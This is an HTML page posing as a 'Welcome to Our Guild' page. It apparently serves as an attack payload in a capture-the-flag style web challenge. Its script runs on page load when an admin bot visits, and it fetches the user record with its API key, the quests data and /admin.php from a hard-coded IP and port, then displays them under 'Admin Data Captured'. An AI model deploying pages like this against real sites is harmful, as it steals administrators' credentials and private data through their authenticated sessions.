<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Guild Page</title>
  <style>
    body {
      font-family: 'Courier New', monospace;
      background-color: #0a0a0f;
      color: #ffd700;
      margin: 0;
      padding: 20px;
      line-height: 1.6;
    }
    .guild-container {
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
      background-color: #1a1a2e;
      border: 1px solid #ffd700;
      border-radius: 5px;
    }
    h1, h2 {
      text-align: center;
    }
    .data-section {
      background-color: #111133;
      padding: 15px;
      border-radius: 4px;
      margin-top: 20px;
      overflow-wrap: break-word;
    }
    pre {
      white-space: pre-wrap;
      font-family: 'Courier New', monospace;
    }
    #loading {
      text-align: center;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="guild-container">
    <h1>Welcome to Our Guild</h1>
    <p id="loading">Loading guild information...</p>
    
    <div id="stolenData" class="hidden">
      <h2>Admin Data Captured</h2>
      <div class="data-section">
        <h3>User Information</h3>
        <pre id="userData">Retrieving...</pre>
      </div>
      
      <div class="data-section">
        <h3>API Key</h3>
        <pre id="apiKey">Retrieving...</pre>
      </div>
      
      <div class="data-section">
        <h3>Admin Panel</h3>
        <pre id="adminPanel">Retrieving...</pre>
      </div>

      <div class="data-section">
        <h3>All Quests</h3>
        <pre id="questsData">Retrieving...</pre>
      </div>
    </div>
  </div>

  <script>
    // This will execute when the admin bot visits the page
    window.onload = function() {
      // First, access user data (which contains the API key)
      fetch('http://94.237.50.164:45551/api/user')
        .then(response => response.json())
        .then(userData => {
          // Display the user data
          document.getElementById('userData').textContent = JSON.stringify(userData, null, 2);
          
          // Extract and display API key specifically
          if (userData.api_key) {
            document.getElementById('apiKey').textContent = userData.api_key;
          }
          
          // Now retrieve quests data
          return fetch('http://94.237.50.164:45551/api/quests');
        })
        .then(response => response.json())
        .then(questsData => {
          document.getElementById('questsData').textContent = JSON.stringify(questsData, null, 2);
          
          // Now try to access the admin panel
          return fetch('/admin.php');
        })
        .then(response => response.text())
        .then(adminHtml => {
          // Extract useful information from admin HTML
          document.getElementById('adminPanel').textContent = adminHtml;
          
          // Show the stolen data section, hide loading
          document.getElementById('loading').classList.add('hidden');
          document.getElementById('stolenData').classList.remove('hidden');
        })
        .catch(error => {
          console.error('Error fetching data:', error);
          document.getElementById('loading').textContent = 'Error loading guild information: ' + error.message;
        });
    };
  </script>
</body>
</html>
